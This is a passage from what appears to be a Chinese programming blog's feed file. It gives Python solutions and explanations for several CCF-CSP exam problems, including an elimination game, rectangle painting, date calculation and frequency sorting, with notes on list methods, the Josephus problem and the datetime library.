<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, k = map(int, input().split())  <span class="comment"># 读取输入n, k</span></div><div class="line">lst = list(range(<span class="number">1</span>, n + <span class="number">1</span>))  <span class="comment"># 编号列表</span></div><div class="line">count, res = <span class="number">1</span>, <span class="number">1</span></div><div class="line"><span class="keyword">while</span> lst:</div><div class="line">    res = lst[<span class="number">0</span>]  <span class="comment"># 取出第1个元素</span></div><div class="line">    lst.remove(res)  <span class="comment"># 出队列，不能用pop()，因为pop是从列表尾部弹出元素</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (count % k == <span class="number">0</span> <span class="keyword">or</span> count % <span class="number">10</span> == k):  <span class="comment"># 报数不为k的倍数并且其末位数（即数的个位）也不为k</span></div><div class="line">        lst.append(res)  <span class="comment"># 入队列</span></div><div class="line">    count += <span class="number">1</span>  <span class="comment"># 报数</span></div><div class="line"></div><div class="line">print(res)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="列表的增删操作"><a href="#列表的增删操作" class="headerlink" title="列表的增删操作"></a>列表的增删操作</h5><ul>
<li>append 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.append(<span class="number">4</span>)  <span class="comment"># 在尾部增加元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<ul>
<li>insert 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.insert(<span class="number">2</span>, <span class="number">5</span>)  <span class="comment"># 在指定位置插入元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<ul>
<li>extend 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.extend([<span class="number">6</span>, <span class="number">7</span>])  <span class="comment"># 在列表末尾一次性追加另一个序列中的多个值</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]</div></pre></td></tr></table></figure>
<ul>
<li>pop 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.pop()  <span class="comment"># 移除列表尾部的元素</span></div><div class="line"><span class="number">7</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<ul>
<li>remove 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.remove(<span class="number">5</span>)  <span class="comment"># 移除列表中的指定元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<ul>
<li>clear 方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.clear()  <span class="comment"># 清空列表中的所有元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[]</div></pre></td></tr></table></figure>
<h5 id="约瑟夫问题"><a href="#约瑟夫问题" class="headerlink" title="约瑟夫问题"></a>约瑟夫问题</h5><p>　　约瑟夫环（约瑟夫问题）是一个数学的应用问题：已知 n 个人（以编号 1，2，3…n 分别表示）围坐在一张圆桌周围。从编号为 k 的人开始报数，数到m的那个人出列；他的下一个人又从1开始报数，数到m的那个人又出列；依此规律重复下去，直到圆桌周围的人全部出列。通常解决这类问题时我们把编号从 0~n-1，最后 [1]  结果+1即为原问题的解。</p>
<p>　　本题的情景与约瑟夫问题类似，因此也可以利用约瑟夫环的递推公式来解题。约瑟夫环的标准数学（找规律）解法：</p>
<ul>
<li>将 k 固定，设解 <code>ANS[n,k] = ans(n)</code></li>
<li>具有 m 个数的 m 约瑟夫环中，删除一个数之后，相当于重新标号后的 <code>m-1</code> 约瑟夫环问题。</li>
<li>设从 a(1) 开始的 m 约瑟夫环答案为 <code>ans(m) = s</code> ，在 m+1 约瑟夫环中，由于经历了重新标号，m 中的标号 a(i) 应该为 <code>a((k+i)%(m+1))</code> ，所以答案下标也要从 s 移动到 <code>(s+k)%(m+1)</code>。</li>
<li>公式：<code>ans(1) = 1, ans(m+1) = (ans(m)+k)%(m+1)</code></li>
</ul>
<p>　　只要知道公式，代码实现就十分简单了，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, k = map(int, input().split())  <span class="comment"># 读取输入的 n 和 k</span></div><div class="line">s = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, n + <span class="number">1</span>):  <span class="comment"># 公式计算</span></div><div class="line">    s = (s + k) % i</div><div class="line"></div><div class="line">print(s + <span class="number">1</span>)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<p>　　由于题目中除了约瑟夫问题中要求的出局条件外，还要求报数的末位数（即数的个位）为k的也出局，所以上述代码只有部分测试样例能够通过，提交只能得30分。但是，约瑟夫问题确实值得了解与学习。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 消除类游戏和画图</title>
    <url>/2018/10/28/CCF-CSP-%E6%B6%88%E9%99%A4%E7%B1%BB%E6%B8%B8%E6%88%8F%E5%92%8C%E7%94%BB%E5%9B%BE/</url>
    <content><![CDATA[<center>CCF-CSP 201512-2 消除类游戏 和 201409-2 画图 题解</center>

<a id="more"></a>
<h4 id="201512-2-消除类游戏"><a href="#201512-2-消除类游戏" class="headerlink" title="201512-2 消除类游戏"></a>201512-2 消除类游戏</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201512-2</div><div class="line">试题名称：消除类游戏</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    消除类游戏是深受大众欢迎的一种游戏，游戏在一个包含有n行m列的游戏棋盘上进行，棋盘的每一行每一列的方格上放着一个有颜色的棋子，当一行或一列上有连续三个或更多的相同颜色的棋子时，这些棋子都被消除。当有多处可以被消除时，这些地方的棋子将同时被消除。</div><div class="line">    现在给你一个n行m列的棋盘，棋盘中的每一个方格上有一个棋子，请给出经过一次消除后的棋盘。</div><div class="line">    请注意：一个棋子可能在某一行和某一列同时被消除。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含两个整数n, m，用空格分隔，分别表示棋盘的行数和列数。</div><div class="line">    接下来n行，每行m个整数，用空格分隔，分别表示每一个方格中的棋子的颜色。颜色使用1至9编号。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出n行，每行m个整数，相邻的整数之间使用一个空格分隔，表示经过一次消除后的棋盘。如果一个方格中的棋子被消除，则对应的方格输出0，否则输出棋子的颜色编号。</div><div class="line"></div><div class="line">样例输入</div><div class="line">4 5</div><div class="line">2 2 3 1 2</div><div class="line">3 4 5 1 4</div><div class="line">2 3 2 1 3</div><div class="line">2 2 2 4 4</div><div class="line"></div><div class="line">样例输出</div><div class="line">2 2 3 0 2</div><div class="line">3 4 5 0 4</div><div class="line">2 3 2 0 3</div><div class="line">0 0 0 4 4</div><div class="line"></div><div class="line">样例说明</div><div class="line">    棋盘中第4列的1和第4行的2可以被消除，其他的方格中的棋子均保留。</div><div class="line"></div><div class="line">样例输入</div><div class="line">4 5</div><div class="line">2 2 3 1 2</div><div class="line">3 1 1 1 1</div><div class="line">2 3 2 1 3</div><div class="line">2 2 3 3 3</div><div class="line"></div><div class="line">样例输出</div><div class="line">2 2 3 0 2</div><div class="line">3 0 0 0 0</div><div class="line">2 3 2 0 3</div><div class="line">2 2 0 0 0</div><div class="line"></div><div class="line">样例说明</div><div class="line">    棋盘中所有的1以及最后一行的3可以被同时消除，其他的方格中的棋子均保留。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    所有的评测用例满足：1 ≤ n, m ≤ 30。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　核心思想还是做标记。初始化一个与输入矩阵同等大小且所有元素都为1的二维数组，然后扫描输入的矩阵，每个元素都向下和向右检查，如果发现当一行或一列上有连续三个或更多的相同颜色的棋子时，就将标记数组中的对应位置置为0.最后，在输出的时候将被标记为0的对应位置的输出修改为0，其余位置正常输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">m, n = map(int, input().split())  <span class="comment"># 读取输入的行列数</span></div><div class="line">lst = []</div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(m):  <span class="comment"># 读取输入的矩阵</span></div><div class="line">    lst.append(list(map(int, input().split())))</div><div class="line">flag = [[<span class="number">1</span>] * n <span class="keyword">for</span> i <span class="keyword">in</span> range(m)]  <span class="comment"># 标记数组，所有元素初始化为1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</div><div class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; m:  <span class="comment"># 向下检查</span></div><div class="line">            <span class="keyword">if</span> lst[i][j] == lst[i + <span class="number">1</span>][j] <span class="keyword">and</span> lst[i][j] == lst[i + <span class="number">2</span>][j]:</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">                    flag[i + k][j] = <span class="number">0</span>  <span class="comment"># 标记</span></div><div class="line">        <span class="keyword">if</span> j + <span class="number">2</span> &lt; n:  <span class="comment"># 向右检查</span></div><div class="line">            <span class="keyword">if</span> lst[i][j] == lst[i][j + <span class="number">1</span>] <span class="keyword">and</span> lst[i][j] == lst[i][j + <span class="number">2</span>]:</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">                    flag[i][j + k] = <span class="number">0</span>  <span class="comment"># 标记</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</div><div class="line">        <span class="keyword">if</span> flag[i][j] != <span class="number">0</span>:  <span class="comment"># 正常输出</span></div><div class="line">            print(lst[i][j], end=<span class="string">" "</span>)</div><div class="line">        <span class="keyword">else</span>:  <span class="comment"># 输出0</span></div><div class="line">            print(flag[i][j], end=<span class="string">" "</span>)</div><div class="line">    print()  <span class="comment"># 换行</span></div></pre></td></tr></table></figure>
<h4 id="201409-2-画图"><a href="#201409-2-画图" class="headerlink" title="201409-2 画图"></a>201409-2 画图</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201409-2</div><div class="line">试题名称：画图</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    在一个定义了直角坐标系的纸上，画一个(x1,y1)到(x2,y2)的矩形指将横坐标范围从x1到x2，纵坐标范围从y1到y2之间的区域涂上颜色。</div><div class="line">    下图给出了一个画了两个矩形的例子。第一个矩形是(1,1) 到(4, 4)，用绿色和紫色表示。第二个矩形是(2, 3)到(6, 5)，用蓝色和紫色表示。图中，一共有15个单位的面积被涂上颜色，其中紫色部分被涂了两次，但在计算面积时只计算一次。在实际的涂色过程中，所有的矩形都涂成统一的颜色，图中显示不同颜色仅为说明方便。</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/10/28-1.png" alt="28-1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">    给出所有要画的矩形，请问总共有多少个单位的面积被涂上颜色。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示要画的矩形的个数。</div><div class="line">    接下来n行，每行4个非负整数，分别表示要画的矩形的左下角的横坐标与纵坐标，以及右上角的横坐标与纵坐标。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示有多少个单位的面积被涂上颜色。</div><div class="line"></div><div class="line">样例输入</div><div class="line">2</div><div class="line">1 1 4 4</div><div class="line">2 3 6 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">15</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1&lt;=n&lt;=100，0&lt;=横坐标、纵坐标&lt;=100。</div></pre></td></tr></table></figure>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　基本思路也是通过标记数组来完成任务。题目给定横坐标和纵坐标在0到100之间，包括100，所以我们用一个 100x100 的二维数组来标记是否有被涂上颜色。首先，初始化 100x100 二维数组的所有元素为0，然后根据题目给出的区域，将区域内元素标记为1，最后再遍历整个二维数组，统计1的个数，即为被涂上颜色的面积。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())	<span class="comment"># 获取输入的矩形个数</span></div><div class="line">s = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):	<span class="comment"># 获取输入的坐标</span></div><div class="line">    s.append(input().split())</div><div class="line"></div><div class="line">c = [[<span class="number">0</span>] * <span class="number">100</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>)]	<span class="comment"># 定义二维数组</span></div><div class="line"></div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):	<span class="comment"># 有矩形覆盖的区域标记为1</span></div><div class="line">    l = list(map(int, s[i]))</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(l[<span class="number">0</span>], l[<span class="number">2</span>]):</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(l[<span class="number">1</span>], l[<span class="number">3</span>]):</div><div class="line">            c[j][k] = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):	<span class="comment"># 统计被标记的区域</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</div><div class="line">        <span class="keyword">if</span> c[i][j] == <span class="number">1</span>:</div><div class="line">            count = count + <span class="number">1</span></div><div class="line">print(count)	<span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 日期计算</title>
    <url>/2018/10/28/CCF-CSP-%E6%97%A5%E6%9C%9F%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<center>CCF-CSP 201509-2 日期计算 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201509-2</div><div class="line">试题名称：日期计算</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定一个年份y和一个整数d，问这一年的第d天是几月几日？</div><div class="line">    注意闰年的2月有29天。满足下面条件之一的是闰年：</div><div class="line">    1） 年份是4的整数倍，而且不是100的整数倍；</div><div class="line">    2） 年份是400的整数倍。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数y，表示年份，年份在1900到2015之间（包含1900和2015）。</div><div class="line">    输入的第二行包含一个整数d，d在1至365之间。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出两行，每行一个整数，分别表示答案的月份和日期。</div><div class="line"></div><div class="line">样例输入</div><div class="line">2015</div><div class="line">80</div><div class="line"></div><div class="line">样例输出</div><div class="line">3</div><div class="line">21</div><div class="line"></div><div class="line">样例输入</div><div class="line">2000</div><div class="line">40</div><div class="line"></div><div class="line">样例输出</div><div class="line">2</div><div class="line">9</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　这个题目还是比较简单的，首先可以构建一个数组，用于存储每个月的天数，通过输入的年份可以判断出是闰年还是平年，然后根据判断的结果修改天数列表中2月的天数，这样就得到了这一年每个月的天数列表。然后，依次遍历这个列表，用输入的天数减去当前月份的天数，如果结果大于0，则说明第d天至少还在下个月，所以将月份加1，总天数减去当前月份的天数。直到总天数减去当前月份的天数小于0，说明第d天就在这个月，输出月份和日期。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">year = int(input())  <span class="comment"># 输入的年份</span></div><div class="line">day = int(input())  <span class="comment"># 输入的天数</span></div><div class="line">base = [<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>]  <span class="comment"># 每个月的天数</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span>) <span class="keyword">or</span> year % <span class="number">400</span> == <span class="number">0</span>:  <span class="comment"># 判断是闰年还是平年</span></div><div class="line">    base[<span class="number">1</span>] = <span class="number">29</span>  <span class="comment"># 闰年的2月有29天</span></div><div class="line"></div><div class="line">month = <span class="number">1</span>  <span class="comment"># 至少是1月</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</div><div class="line">    <span class="keyword">if</span> day - i &gt; <span class="number">0</span>:  <span class="comment"># 计算月份与日期</span></div><div class="line">        month += <span class="number">1</span>  <span class="comment"># 月份加1</span></div><div class="line">        day = day - i  <span class="comment"># 天数减去当前月份的天数</span></div><div class="line">    <span class="keyword">else</span>:  <span class="comment"># 输出结果</span></div><div class="line">        print(month)</div><div class="line">        print(day)</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　使用内部的库 <code>datetime</code> ，将输入年份的第一天转换成 datetime，然后将天数转换成 datetime 的时间增量，第 1 天加上时间增量即为 y 年的第 d 天，推算完成后输出结果即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> datetime</div><div class="line"></div><div class="line">y = int(input())  <span class="comment"># 输入的年份</span></div><div class="line">day_of_year = int(input())  <span class="comment"># 输入的天数</span></div><div class="line">date0 = datetime.datetime(y, <span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># 初始时间</span></div><div class="line">delta = datetime.timedelta(days=day_of_year - <span class="number">1</span>)  <span class="comment"># 增量</span></div><div class="line">date1 = date0 + delta  <span class="comment"># 日期推算</span></div><div class="line">print(date1.month)  <span class="comment"># 输出月份</span></div><div class="line">print(date1.day)  <span class="comment"># 输出日期</span></div></pre></td></tr></table></figure>
<h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><h5 id="datetime-库"><a href="#datetime-库" class="headerlink" title="datetime 库"></a>datetime 库</h5><ul>
<li>date 类</li>
</ul>
<p>　　<code>date</code> 对象表示理想化日历中的日期（年，月和日），当前格里高利历在两个方向上无限延伸。 1年1月1日称为第1天，1年1月2日称为第2天，依此类推。<code>date</code> 类有三个参数，<code>datetime.date(year,month,day)</code>，返回 <code>year-month-day</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> datetime</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = datetime.date(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">28</span>)  <span class="comment"># 将日期转换为 date 对象</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.date.weekday(d)  <span class="comment"># 返回日期的星期</span></div><div class="line"><span class="number">6</span>  <span class="comment"># 2018年10月28日是星期天，返回的值是从0开始的数</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.date.isoformat(d)  <span class="comment"># 返回格式为 YYYY-MM-DD 的日期</span></div><div class="line"><span class="string">'2018-10-28'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.date.today()  <span class="comment"># 返回当前系统日期</span></div><div class="line">datetime.date(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">28</span>)</div></pre></td></tr></table></figure>
<ul>
<li>datetime 类</li>
</ul>
<p>　　<code>datetime</code> 对象是包含日期对象和时间对象的所有信息的单个对象。与日期对象一样，日期时间假定当前公历在两个方向上延伸；像时间对象一样，日期时间假设每天都有3600 * 24秒。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> datetime</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime(<span class="number">2018</span>, <span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># 将时间转换成 datetime 对象</span></div><div class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now()  <span class="comment"># 返回当前系统时间</span></div><div class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">55</span>, <span class="number">18</span>, <span class="number">292266</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now().strftime(<span class="string">'%b-%d-%Y %H:%M:%S'</span>)  <span class="comment"># 由日期格式转化为字符串格式</span></div><div class="line"><span class="string">'Oct-27-2018 21:57:16'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now().date()  <span class="comment"># 返回当前日期时间的日期部分</span></div><div class="line">datetime.date(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">27</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now().time()  <span class="comment"># 返回当前日期时间的时间部分</span></div><div class="line">datetime.time(<span class="number">21</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">927696</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.today()  <span class="comment"># 返回当前系统时间</span></div><div class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">935058</span>)</div></pre></td></tr></table></figure>
<ul>
<li>timedelta 类</li>
</ul>
<p>　　<code>timedelta</code> 对象表示持续时间，两个日期或时间之间的差异，用于计算两个日期之间的差值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = datetime.datetime.now()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = datetime.datetime.now()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b-a  <span class="comment"># 计算差值</span></div><div class="line">datetime.timedelta(seconds=<span class="number">4</span>, microseconds=<span class="number">352740</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>(b-a).seconds  <span class="comment"># 计算秒数差值</span></div><div class="line"><span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>(b-a).days  <span class="comment"># 计算天数差值</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 数字排序</title>
    <url>/2018/10/27/CCF-CSP-%E6%95%B0%E5%AD%97%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>CCF-CSP 201503-2 数字排序 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201503-2</div><div class="line">试题名称：数字排序</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定n个整数，请统计出每个整数出现的次数，按出现次数从多到少的顺序输出。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示给定数字的个数。</div><div class="line">    第二行包含n个整数，相邻的整数之间用一个空格分隔，表示所给定的整数。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出多行，每行包含两个整数，分别表示一个给定的整数和它出现的次数。按出现次数递减的顺序输出。如果两个整数出现的次数一样多，则先输出值较小的，然后输出值较大的。</div><div class="line"></div><div class="line">样例输入</div><div class="line">12</div><div class="line">5 2 3 3 1 3 4 2 5 2 3 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">3 4</div><div class="line">2 3</div><div class="line">5 3</div><div class="line">1 1</div><div class="line">4 1</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1 ≤ n ≤ 1000，给出的数都是不超过1000的非负整数。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　最容易可以想到的方法当然是使用数组来记录出现次数了。由于题目给出了范围不超过1000，所以开辟一个1000个元素的数组，将输入的整数作为数组索引，数组元素作为其索引整数出现的次数，遍历输入的整数列表，统计每个整数的出现次数。在输出时，先倒序循环出现的次数，最大出现次数不过1000次，再从小到大循环索引，有出现次数与数组元素相同的就输出数组元素索引和值，索引为整数，值为整数出现的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 整数列表</span></div><div class="line">L = [<span class="number">0</span>] * <span class="number">1001</span>  <span class="comment"># 记录数组，索引为整数，值为整数出现的次数</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    L[lst[i]] += <span class="number">1</span>  <span class="comment"># 记录出现次数</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">-1</span>, <span class="number">-1</span>):  <span class="comment"># 出现次数</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1001</span>):  <span class="comment"># 整数</span></div><div class="line">        <span class="keyword">if</span> L[j] != <span class="number">0</span> <span class="keyword">and</span> L[j] == i:  <span class="comment"># 匹配程序爱你次数记录与当前出现次数相等的整数</span></div><div class="line">            print(j, i)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　当然，我们也可以使用 <code>set()、zip()</code> 等内建函数对数据进行快速处理。首先，使用 <code>set()</code> 函数将输入的数据中不重复的整数提取出来，然后统计这些整数出现的次数，再将整数与其出现次数组合成列表，使用 <code>sort()</code> 函数根据其出现次数对列表进行逆序排序即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 整数列表</span></div><div class="line">s = set(lst)  <span class="comment"># 不重复整数的集合</span></div><div class="line">rst = list(zip(s, map(lst.count, s)))  <span class="comment"># 整数与其出现次数的列表</span></div><div class="line">rst.sort(key=<span class="keyword">lambda</span> k: k[<span class="number">1</span>], reverse=<span class="keyword">True</span>)  <span class="comment"># 根据出现次数排序，逆序</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rst:</div><div class="line">    print(i[<span class="number">0</span>], i[<span class="number">1</span>])  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 火车购票</title>
    <url>/2018/10/21/CCF-CSP-%E7%81%AB%E8%BD%A6%E8%B4%AD%E7%A5%A8/</url>
    <content><![CDATA[<center>CCF-CSP 201609-2 火车购票 题解</center>

<a id="more"></a>
